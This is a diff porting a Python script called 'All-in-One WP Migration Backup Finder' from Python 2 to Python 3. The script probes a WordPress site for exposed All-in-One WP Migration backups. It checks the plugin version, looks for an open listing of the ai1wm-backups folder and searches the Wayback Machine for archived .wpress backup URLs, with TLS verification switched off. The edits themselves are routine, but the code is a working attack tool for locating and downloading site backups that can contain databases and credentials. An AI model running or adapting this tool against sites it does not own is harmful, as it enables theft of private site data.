@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # -*- coding: UTF-8 -*-
 #
 # All-in-One WP Migration Backup Finder
@@ -16,8 +16,8 @@
 import requests
 import concurrent.futures
 from datetime import datetime, timedelta
-from urlparse import urlparse
 import argparse
+from urllib.parse import urlparse
 import sys
 import os
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -33,20 +33,20 @@ url = args.url
 
 def vercheck (url,headers):
 	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
-	if "7.15" in vercheck.content:
+	if "7.15" in vercheck.text:
 		print("This version is not vulnerable sorry")
 		sys.exit(0)
 
 def lazycheck(url,headers):
 	lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,verify=False)
-	if ".wpress" in lazycheck.content:
+	if ".wpress" in lazycheck.text:
 		print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
 		print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
 		sys.exit(0)
 
 def wayback(domain,headers):
 	wayback = session.get("http://web.archive.org/cdx/search/cdx?url="+url+"*&output=txt&fl=original&collapse=urlkey", headers=headers,verify=False)
-	if "wp-content/ai1wm-backups" in wayback.content:
+	if "wp-content/ai1wm-backups" in wayback.text:
 		print ("[*] OOOOOOO Wayback machine has a potenital url to check.")
 		for line in wayback.content:
 			if ".wpress" in line:
